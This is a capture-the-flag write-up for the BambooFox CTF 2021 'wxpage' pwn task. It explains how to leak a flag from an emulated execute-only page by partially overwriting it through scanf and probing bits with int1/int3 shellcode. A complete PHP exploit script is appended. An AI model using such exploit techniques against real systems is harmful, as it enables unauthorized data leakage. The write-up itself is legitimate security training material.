# wxpage - BambooFox CTF 2021 (pwn, 498p)

## Introduction
wxpage is a pwn task.

An archive containing a binary, a copy of the unicorn engine library and a
Dockerfile is given.

The goal of this task is to leak data from an executable-only page.

## Reverse engineering
The binary first open the flag file and reads it. The flag is 32 (`0x20`)
character long.

The binary then reads 32 unsigned bytes from the standard input with
`scanf("%hhu")` on top of the flag.

```c
int fd = open("flag", O_RDONLY);
read(fd, flag, 0x20);
close(fd);

for(size_t i = 0; i < 0x20; i++)
	scanf("%hhu", flag + i);
```

The binary then uses unicorn engine to emulate an x86 processor. This processor
has memory mapped from `0x01234000` to `0x01236000`. The flag (overwritten by
`scanf` is written to `0x01234000`)

The binary hooks memory accesses with `hook_mem64` to make sure the emulated
code can only access the `0x01235000` -- `0x01236000` range.

It also hooks syscalls to implement a `puts` syscall (when `rax` is set to 1).

## Vulnerability
It is possible to partially overwrite the flag by feeding invalid values to
`scanf` such as `-`.

## Exploitation
Now that it is possible to partially overwrite the flag, it becomes possible to
write a code that will load a specific byte of the flag, compare it, and do
specific actions depending on the result of this comparision.

There are many ways to show the result of an operation:
- use the `puts` syscall
- loop indefinitely
- throw exceptions

The method presented in this write-up is the last one because it requires only
two bytes. Opcodes `int3` and `int1` both require one byte and make the emulator
stop with different errors.

The following code can be used to leak the 2nd byte of the flag:
```assembly
/* B0 --    */ mov  al, --
/* F6 C0 xx */ test al, 1 << bit
/* 74 01    */ jz 1
/* F1       */ int1
/* CC       */ int3
```

This construct can be used to leak every bytes but the first (because of the
`0xB0` and the 5 last bytes. This can be done by sliding the code:

```
flag| attempts
----+---------
 00 | B0 90 90
 01 | -- B0 90
 02 | F6 -- B0
 03 | C0 F6 --
 04 | ?? C0 F6
 05 | 74 ?? C0
 06 | 02 74 ??
 07 | 0F 02 74
 08 | 05 0F 02
 09 | 90 05 0F
 0A | 90 90 05
 0B | 90 90 90
     ...
 1F | 90 90 90
```

The last few bytes can be leaked with a different method:
```assembly
/* 68 07 40 23 01 */ push 0x01234007
/* EB --          */ jmp  load

/* F6 C0 xx       */ test al, 1 << bit
/* 74 01          */ jz 1
/* F1             */ int1
/* CC             */ int3

/* 90 90 90 ...   */ nop sled

/* B0 --          */ mov al, --
/* C3             */ ret
```

By combining the two methods, it is possible to leak every bytes except the
first and last bytes. The missing bytes can be guessed by filling the flag
format (first byte is the `f` of `flag` and last byte is a `}`)

## Exploitation
**Flag**: `flag{0nly_write_and_ex3c_AC1z5A}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php
const HOST = "chall.ctf.bamboofox.tw";
const PORT = 10105;

function remote(array $shellcode) : string
{
	if(sizeof($shellcode) > 0x20)
		throw new Exception("Shellcode is too big");
	$shellcode = array_pad($shellcode, 0x20, 0x90);

	$data = implode(" ", $shellcode) . "\n";
	$fp   = fsockopen(HOST, PORT);
	fwrite($fp, $data);
	return fread($fp, 4096);
}

function leakBit(int $byte, int $bit) : bool
{
	if($bit >= 7) return false;
	if($bit <  0) return false;

	if($byte < 1)
		throw new Exception("Cannot leak byte 0");

	$shellcode = array_fill(0, $byte - 1, 0x90); // nop sled

	// mov al flag[x]
	$shellcode[] = 0xB0;
	$shellcode[] = '-';

	// test al, $bit
	$shellcode[] = 0xF6;
	$shellcode[] = 0xC0;
	$shellcode[] = 1 << $bit;

	// jz 1
	$shellcode[] = 0x74;
	$shellcode[] = 0x01;

	// int1
	$shellcode[] = 0xF1;

	// int3
	$shellcode[] = 0xCC;

	$data = remote($shellcode);
	return false !== strpos($data, "UC_ERR_INSN_INVALID");
}

function leakBit_last(int $byte, int $bit) : bool
{
	if($bit >= 7) return false;
	if($bit <  0) return false;

	$shellcode = [];

	// push 0x1234007
	$shellcode[] = 0x68;
	$shellcode[] = 0x07;
	$shellcode[] = 0x40;
	$shellcode[] = 0x23;
	$shellcode[] = 0x01;

	// jmp load
	$shellcode[] = 0xEB;
	$shellcode[] = $byte - (sizeof($shellcode) + 1) - 1;

	// 0x01234007:
	// test al, $bit
	$shellcode[] = 0xF6;
	$shellcode[] = 0xC0;
	$shellcode[] = 1 << $bit;

	// jz 1
	$shellcode[] = 0x74;
	$shellcode[] = 0x01;

	// int1
	$shellcode[] = 0xF1;

	// int3
	$shellcode[] = 0xCC;

	// pad until load
	$shellcode   = array_pad($shellcode, $byte - 1, 0x90);

	// mov al flag[x]
	$shellcode[] = 0xB0;
	$shellcode[] = '-';

	// ret
	$shellcode[] = 0xC3;

	$data = remote($shellcode);
	return false !== strpos($data, "UC_ERR_INSN_INVALID");
}

function leakByte(int $byte) : int
{
	$f = ["leakBit", "leakBit_last"][$byte > 0x18];

	$char = 0;
	for($i = 0; $i < 7; $i++)
		$char |= $f($byte, $i) << $i;
	return $char;
}

$flag = "?";

while(strlen($flag) < 0x20 - 1) {
	$byte  = leakByte(strlen($flag));
	$flag .= chr($byte);
	printf("Flag: %s (%X)\n", $flag, $byte);
}
```
